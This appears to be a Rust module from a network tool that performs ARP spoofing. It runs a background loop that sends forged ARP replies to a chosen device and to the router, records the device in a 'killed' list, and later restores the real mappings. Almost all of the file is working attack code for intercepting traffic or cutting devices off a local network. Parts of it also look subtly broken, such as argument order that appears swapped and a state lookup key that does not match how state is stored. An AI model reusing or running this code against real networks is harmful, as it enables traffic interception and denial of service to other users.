use std::collections::HashMap;
use std::time::Duration;

use pnet_datalink::{self, Channel, Config, DataLinkSender, NetworkInterface};
use pnet_packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet_packet::ethernet::{EtherTypes, MutableEthernetPacket};
use tokio::sync::{broadcast, Mutex, RwLock, Semaphore};
use tokio::task::JoinHandle;

use crate::network::killed_macs::add_mac as add_killed_mac;
use crate::network::poison_state::{add_poisoning_target, remove_poisoning_target};
use crate::network::types::{Device, NetworkError, PoisoningConfig, PoisoningState, Result};

/// Global rate limiter: max 10 concurrent poisoning operations to prevent network flooding
static POISONING_STATE: once_cell::sync::Lazy<RwLock<HashMap<String, PoisoningState>>> =
    once_cell::sync::Lazy::new(|| RwLock::new(HashMap::new()));

static ACTIVE_HANDLES: once_cell::sync::Lazy<Mutex<HashMap<String, JoinHandle<()>>>> =
    once_cell::sync::Lazy::new(|| Mutex::new(HashMap::new()));

static POISON_LIMIT: once_cell::sync::Lazy<Semaphore> =
    once_cell::sync::Lazy::new(|| Semaphore::new(10));

pub async fn start_poisoning(
    target: Device,
    router: Device,
    interface_name: &str,
) -> Result<()> {
    // Enforce global rate limit: max 10 concurrent poisoning operations
    let permit = POISON_LIMIT.acquire()
        .await
        .map_err(|_| NetworkError::PoisoningError("Rate limit service unavailable".to_string()))?;

    let state_key = format!("{}-{}", target.mac, router.mac);

    {
        let state = POISONING_STATE.read().await;
        if state.get(&state_key) == Some(&PoisoningState::Active) {
            return Err(NetworkError::PoisoningError(
                "Poisoning already active for this target".to_string(),
            ));
        }
    }

    {
        let mut state = POISONING_STATE.write().await;
        state.insert(state_key.clone(), PoisoningState::Active);
    }

    let _ = add_poisoning_target(&target, &router, interface_name).await;
    let _ = add_killed_mac(target.mac.clone(), target.ip.clone()).await;

    let (tx, _rx) = broadcast::channel(1);

    let handle = tokio::spawn(poisoning_loop_with_permit(
        target.clone(),
        router.clone(),
        interface_name.to_string(),
        tx,
        permit,
    ));

    {
        let mut handles = ACTIVE_HANDLES.lock().await;
        handles.insert(state_key, handle);
    }

    Ok(())
}

pub async fn stop_poisoning(target: Device, router: Device, interface_name: &str) -> Result<()> {
    let state_key = format!("{}-{}", target.mac, router.mac);

    {
        let state = POISONING_STATE.read().await;
        if state.get(&state_key) != Some(&PoisoningState::Active) {
            return Err(NetworkError::PoisoningError(
                "Poisoning not active for this target".to_string(),
            ));
        }
    }

    {
        let mut state = POISONING_STATE.write().await;
        state.insert(state_key.clone(), PoisoningState::Stopping);
    }

    {
        let mut handles = ACTIVE_HANDLES.lock().await;
        if let Some(handle) = handles.remove(&state_key) {
            handle.abort();
        }
    }

    send_restore_packets(&target, &router, interface_name).await?;

    {
        let mut state = POISONING_STATE.write().await;
        state.insert(state_key.clone(), PoisoningState::Idle);
    }

    let _ = remove_poisoning_target(&target.ip, &router.ip).await;

    Ok(())
}

/// Poisoning loop that holds a rate limit permit for its entire duration.
/// The permit is released when the function returns (on drop).
async fn poisoning_loop_with_permit(
    target: Device,
    router: Device,
    interface_name: String,
    stop_signal: broadcast::Sender<()>,
    _permit: tokio::sync::SemaphorePermit<'static>,
) {
    let config = PoisoningConfig::default();
    let mut stop_receiver = stop_signal.subscribe();

    let interfaces = pnet_datalink::interfaces();
    let interface = match interfaces.into_iter().find(|iface| iface.name == interface_name) {
        Some(iface) => iface,
        None => {
            log::error!("Interface {} not found", interface_name);
            return;
        }
    };

    let (mut tx, _) = match create_poison_channel(&interface) {
        Ok(channel) => channel,
        Err(e) => {
            log::error!("Failed to create channel: {}", e);
            return;
        }
    };

    let my_mac = match interface.mac {
        Some(mac) => mac.octets(),
        None => {
            log::error!("Interface {} has no MAC", interface_name);
            return;
        }
    };

    let mut interval = tokio::time::interval(Duration::from_millis(config.interval_ms));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = stop_receiver.recv() => {
                log::info!("Stopping poisoning loop");
                break;
            }
            _ = interval.tick() => {
                if let Err(e) = poison_target(&mut tx, &interface, &target, &router, my_mac).await {
                    log::warn!("Failed to poison target: {}", e);
                }
                if let Err(e) = poison_router(&mut tx, &interface, &target, &router, my_mac).await {
                    log::warn!("Failed to poison router: {}", e);
                }
            }
        }
    }
    // Permit automatically released when function returns
}

async fn poison_target(
    tx: &mut Box<dyn DataLinkSender + Send>,
    interface: &NetworkInterface,
    target: &Device,
    router: &Device,
    my_mac: [u8; 6],
) -> Result<()> {
    // Validate MAC to prevent poisoning invalid addresses (security fix)
    let target_mac = crate::network::utils::validate_unicast_mac(&target.mac)?;
    let target_ip = target
        .ip
        .parse::<std::net::Ipv4Addr>()
        .map_err(|_| NetworkError::InvalidIpAddress(target.ip.clone()))?;
    let router_ip = router
        .ip
        .parse::<std::net::Ipv4Addr>()
        .map_err(|_| NetworkError::InvalidIpAddress(router.ip.clone()))?;

    let packet = build_arp_reply(
        interface,
        my_mac,
        target_mac,
        target_ip,
        my_mac,
        router_ip,
    )?;

    let _ = tx.send_to(&packet, Some(interface.clone()));

    Ok(())
}

async fn poison_router(
    tx: &mut Box<dyn DataLinkSender + Send>,
    interface: &NetworkInterface,
    target: &Device,
    router: &Device,
    my_mac: [u8; 6],
) -> Result<()> {
    // Validate MAC to prevent poisoning invalid addresses (security fix)
    let router_mac = crate::network::utils::validate_unicast_mac(&router.mac)?;
    let router_ip = router
        .ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(router.ip.clone()))?;
    let target_ip = target
        .ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(target.ip.clone()))?;

    let packet = build_arp_reply(
        interface,
        my_mac,
        router_mac,
        target_ip,
        my_mac,
        router_ip,
    )?;

    let _ = tx.send_to(&packet, Some(interface.clone()));

    Ok(())
}

fn build_arp_reply(
    _interface: &NetworkInterface,
    source_mac: [u8; 6],
    dest_mac: [u8; 6],
    sender_proto_addr: std::net::Ipv4Addr,
    sender_hw_addr: [u8; 6],
    target_proto_addr: std::net::Ipv4Addr,
) -> Result<Vec<u8>> {
    let mut ethernet_buffer = vec![0u8; 14 + 28];

    {
        let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
        ethernet_packet.set_destination(dest_mac.into());
        ethernet_packet.set_source(source_mac.into());
        ethernet_packet.set_ethertype(EtherTypes::Arp);
    }

    {
        let mut arp_packet = MutableArpPacket::new(&mut ethernet_buffer[14..]).unwrap();
        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Reply);
        arp_packet.set_sender_hw_addr(sender_hw_addr.into());
        arp_packet.set_sender_proto_addr(sender_proto_addr);
        arp_packet.set_target_hw_addr(dest_mac.into());
        arp_packet.set_target_proto_addr(target_proto_addr);
    }

    Ok(ethernet_buffer)
}

async fn send_restore_packets(
    target: &Device,
    router: &Device,
    interface_name: &str,
) -> Result<()> {
    let config = PoisoningConfig::default();

    let interfaces = pnet_datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == interface_name)
        .ok_or_else(|| NetworkError::InterfaceNotFound(interface_name.to_string()))?;

    let (mut tx, _) = create_poison_channel(&interface)?;

    let target_mac = parse_mac_bytes(&target.mac)?;
    let router_mac = parse_mac_bytes(&router.mac)?;
    let target_ip = target
        .ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(target.ip.clone()))?;
    let router_ip = router
        .ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(router.ip.clone()))?;

    for _ in 0..config.restore_count {
        let packet1 = build_arp_reply(
            &interface,
            router_mac,
            target_mac,
            router_ip,
            router_mac,
            target_ip,
        )?;

        let _ = tx.send_to(&packet1, Some(interface.clone()));

        let packet2 = build_arp_reply(
            &interface,
            target_mac,
            router_mac,
            target_ip,
            target_mac,
            router_ip,
        )?;

        let _ = tx.send_to(&packet2, Some(interface.clone()));

        tokio::time::sleep(Duration::from_millis(config.restore_interval_ms)).await;
    }

    Ok(())
}

pub async fn send_single_restore(
    target: &Device,
    router: &Device,
    interface_name: &str,
) -> Result<()> {
    let config = PoisoningConfig::default();

    let interfaces = pnet_datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == interface_name)
        .ok_or_else(|| NetworkError::InterfaceNotFound(interface_name.to_string()))?;

    let (mut tx, _) = create_poison_channel(&interface)?;

    let target_mac = parse_mac_bytes(&target.mac)?;
    let router_mac = parse_mac_bytes(&router.mac)?;
    let target_ip = target
        .ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(target.ip.clone()))?;
    let router_ip = router
        .ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(router.ip.clone()))?;

    for _ in 0..config.restore_count {
        let packet1 = build_arp_reply(
            &interface,
            router_mac,
            target_mac,
            router_ip,
            router_mac,
            target_ip,
        )?;

        let _ = tx.send_to(&packet1, Some(interface.clone()));

        let packet2 = build_arp_reply(
            &interface,
            target_mac,
            router_mac,
            target_ip,
            target_mac,
            router_ip,
        )?;

        let _ = tx.send_to(&packet2, Some(interface.clone()));

        tokio::time::sleep(Duration::from_millis(config.restore_interval_ms)).await;
    }

    Ok(())
}

#[allow(dead_code)]
pub async fn poison_once(
    target_mac: &str,
    target_ip: &str,
    router_ip: &str,
    my_mac: &str,
    interface_name: &str,
) -> Result<()> {
    let interfaces = pnet_datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == interface_name)
        .ok_or_else(|| NetworkError::InterfaceNotFound(interface_name.to_string()))?;

    let (mut tx, _) = create_poison_channel(&interface)?;

    let dest_mac = parse_mac_bytes(target_mac)?;
    let source_mac = parse_mac_bytes(my_mac)?;
    let sender_ip = router_ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(router_ip.to_string()))?;
    let target_ip_addr = target_ip
        .parse()
        .map_err(|_| NetworkError::InvalidIpAddress(target_ip.to_string()))?;

    let packet = build_arp_reply(
        &interface,
        source_mac,
        dest_mac,
        sender_ip,
        source_mac,
        target_ip_addr,
    )?;

    let _ = tx.send_to(&packet, Some(interface.clone()));

    Ok(())
}

fn create_poison_channel(
    interface: &NetworkInterface,
) -> Result<(Box<dyn DataLinkSender + Send>, Box<dyn pnet_datalink::DataLinkReceiver + Send>)>
{
    let config = Config {
        read_timeout: Some(Duration::from_millis(100)),
        ..Default::default()
    };

    match pnet_datalink::channel(interface, config) {
        Ok(Channel::Ethernet(tx, rx)) => Ok((tx, rx)),
        Ok(_) => Err(NetworkError::RawSocketError(
            "Unsupported channel type".to_string(),
        )),
        Err(e) => Err(NetworkError::RawSocketError(format!(
            "Failed to create channel: {} (requires root/admin)",
            e
        ))),
    }
}

fn parse_mac_bytes(mac: &str) -> Result<[u8; 6]> {
    let cleaned: String = mac
        .to_lowercase()
        .chars()
        .filter(|c| c.is_ascii_hexdigit())
        .collect();

    if cleaned.len() != 12 {
        return Err(NetworkError::InvalidMacAddress(mac.to_string()));
    }

    let mut result = [0u8; 6];
    for i in 0..6 {
        let byte_str = &cleaned[i * 2..i * 2 + 2];
        result[i] = u8::from_str_radix(byte_str, 16)
            .map_err(|_| NetworkError::InvalidMacAddress(mac.to_string()))?;
    }

    Ok(result)
}

#[allow(dead_code)]
pub async fn get_poisoning_state(target_ip: &str, router_ip: &str) -> PoisoningState {
    let state_key = format!("{}-{}", target_ip, router_ip);
    let state = POISONING_STATE.read().await;
    state.get(&state_key).copied().unwrap_or(PoisoningState::Idle)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_mac_bytes() {
        let result = parse_mac_bytes("aa:bb:cc:dd:ee:ff").unwrap();
        assert_eq!(result, [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]);

        let result = parse_mac_bytes("aabbccddeeff").unwrap();
        assert_eq!(result, [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]);

        assert!(parse_mac_bytes("invalid").is_err());
    }
}
